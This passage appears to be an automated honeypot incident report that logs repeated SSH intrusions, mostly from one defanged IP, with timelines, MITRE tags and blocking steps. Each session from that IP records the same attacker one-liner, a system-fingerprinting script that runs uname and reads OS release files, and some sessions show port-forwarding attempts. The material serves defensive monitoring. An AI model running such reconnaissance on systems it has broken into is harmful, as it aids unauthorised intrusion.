| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:20:38` | `cowrie.session.connect` |
| `2026-08-01 12:20:38` | `cowrie.client.version` |
| `2026-08-01 12:20:38` | `cowrie.client.kex` |
| `2026-08-01 12:20:39` | `cowrie.login.success` |
| `2026-08-01 12:20:40` | `cowrie.session.params` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.command.success` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.command.input` |
| `2026-08-01 12:20:40` | `cowrie.log.closed` |
| `2026-08-01 12:20:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef71ea0bf577

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:22 |
| **Last Seen** | 2026-08-01 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:22:23` | `cowrie.session.connect` |
| `2026-08-01 12:22:23` | `cowrie.client.version` |
| `2026-08-01 12:22:23` | `cowrie.client.kex` |
| `2026-08-01 12:22:24` | `cowrie.login.success` |
| `2026-08-01 12:22:25` | `cowrie.session.params` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:25` | `cowrie.command.success` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:25` | `cowrie.command.input` |
| `2026-08-01 12:22:26` | `cowrie.log.closed` |
| `2026-08-01 12:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c800c28205b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:24 |
| **Last Seen** | 2026-08-01 12:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:24:15` | `cowrie.session.connect` |
| `2026-08-01 12:24:15` | `cowrie.client.version` |
| `2026-08-01 12:24:15` | `cowrie.client.kex` |
| `2026-08-01 12:24:16` | `cowrie.login.success` |
| `2026-08-01 12:24:18` | `cowrie.session.params` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.command.success` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.command.input` |
| `2026-08-01 12:24:18` | `cowrie.log.closed` |
| `2026-08-01 12:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98fe2620040a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:26 |
| **Last Seen** | 2026-08-01 12:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:26:01` | `cowrie.session.connect` |
| `2026-08-01 12:26:02` | `cowrie.client.version` |
| `2026-08-01 12:26:02` | `cowrie.client.kex` |
| `2026-08-01 12:26:03` | `cowrie.login.success` |
| `2026-08-01 12:26:04` | `cowrie.session.params` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:04` | `cowrie.command.success` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:04` | `cowrie.command.input` |
| `2026-08-01 12:26:05` | `cowrie.log.closed` |
| `2026-08-01 12:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4718ba7e029

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:27 |
| **Last Seen** | 2026-08-01 12:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:27:49` | `cowrie.session.connect` |
| `2026-08-01 12:27:49` | `cowrie.client.version` |
| `2026-08-01 12:27:49` | `cowrie.client.kex` |
| `2026-08-01 12:27:50` | `cowrie.login.success` |
| `2026-08-01 12:27:52` | `cowrie.session.params` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.command.success` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.command.input` |
| `2026-08-01 12:27:52` | `cowrie.log.closed` |
| `2026-08-01 12:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2463868d37

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:29 |
| **Last Seen** | 2026-08-01 12:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:29:35` | `cowrie.session.connect` |
| `2026-08-01 12:29:35` | `cowrie.client.version` |
| `2026-08-01 12:29:35` | `cowrie.client.kex` |
| `2026-08-01 12:29:37` | `cowrie.login.success` |
| `2026-08-01 12:29:38` | `cowrie.session.params` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.command.success` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.command.input` |
| `2026-08-01 12:29:38` | `cowrie.log.closed` |
| `2026-08-01 12:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9409650e59b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:31 |
| **Last Seen** | 2026-08-01 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:31:20` | `cowrie.session.connect` |
| `2026-08-01 12:31:20` | `cowrie.client.version` |
| `2026-08-01 12:31:20` | `cowrie.client.kex` |
| `2026-08-01 12:31:22` | `cowrie.login.success` |
| `2026-08-01 12:31:23` | `cowrie.session.params` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.command.success` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.command.input` |
| `2026-08-01 12:31:23` | `cowrie.log.closed` |
| `2026-08-01 12:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da667ae24ec3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:33 |
| **Last Seen** | 2026-08-01 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:33:06` | `cowrie.session.connect` |
| `2026-08-01 12:33:07` | `cowrie.client.version` |
| `2026-08-01 12:33:07` | `cowrie.client.kex` |
| `2026-08-01 12:33:08` | `cowrie.login.success` |
| `2026-08-01 12:33:09` | `cowrie.session.params` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.command.success` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.command.input` |
| `2026-08-01 12:33:09` | `cowrie.log.closed` |
| `2026-08-01 12:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f182bfe5900

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:34 |
| **Last Seen** | 2026-08-01 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:34:53` | `cowrie.session.connect` |
| `2026-08-01 12:34:54` | `cowrie.client.version` |
| `2026-08-01 12:34:54` | `cowrie.client.kex` |
| `2026-08-01 12:34:55` | `cowrie.login.success` |
| `2026-08-01 12:34:56` | `cowrie.session.params` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.command.success` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.command.input` |
| `2026-08-01 12:34:56` | `cowrie.log.closed` |
| `2026-08-01 12:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99b2ed655541

| Field | Detail |
|---|---|
| **Source IP** | `8.134.196[.]84` |
| **First Seen** | 2026-08-01 12:35 |
| **Last Seen** | 2026-08-01 12:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:35:53` | `cowrie.session.connect` |
| `2026-08-01 12:35:53` | `cowrie.client.version` |
| `2026-08-01 12:35:53` | `cowrie.client.kex` |
| `2026-08-01 12:35:54` | `cowrie.login.success` |
| `2026-08-01 12:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.134.196[.]84` to AbuseIPDB if not already reported
- [ ] Block `8.134.196[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4717643f3fc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:36 |
| **Last Seen** | 2026-08-01 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:36:42` | `cowrie.session.connect` |
| `2026-08-01 12:36:42` | `cowrie.client.version` |
| `2026-08-01 12:36:42` | `cowrie.client.kex` |
| `2026-08-01 12:36:43` | `cowrie.login.success` |
| `2026-08-01 12:36:44` | `cowrie.session.params` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.command.success` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.command.input` |
| `2026-08-01 12:36:44` | `cowrie.log.closed` |
| `2026-08-01 12:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e20e76a81ed1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:38 |
| **Last Seen** | 2026-08-01 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:38:33` | `cowrie.session.connect` |
| `2026-08-01 12:38:33` | `cowrie.client.version` |
| `2026-08-01 12:38:33` | `cowrie.client.kex` |
| `2026-08-01 12:38:34` | `cowrie.login.success` |
| `2026-08-01 12:38:35` | `cowrie.session.params` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.command.success` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.command.input` |
| `2026-08-01 12:38:35` | `cowrie.log.closed` |
| `2026-08-01 12:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849ae9440627

| Field | Detail |
|---|---|
| **Source IP** | `122.170.99[.]195` |
| **First Seen** | 2026-08-01 12:39 |
| **Last Seen** | 2026-08-01 12:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:39:40` | `cowrie.session.connect` |
| `2026-08-01 12:39:41` | `cowrie.client.version` |
| `2026-08-01 12:39:41` | `cowrie.client.kex` |
| `2026-08-01 12:39:42` | `cowrie.login.success` |
| `2026-08-01 12:39:43` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.99[.]195` to AbuseIPDB if not already reported
- [ ] Block `122.170.99[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a2972ccd5a

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-01 12:39 |
| **Last Seen** | 2026-08-01 12:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:39:48` | `cowrie.session.connect` |
| `2026-08-01 12:39:48` | `cowrie.client.version` |
| `2026-08-01 12:39:48` | `cowrie.client.kex` |
| `2026-08-01 12:39:49` | `cowrie.login.success` |
| `2026-08-01 12:39:50` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
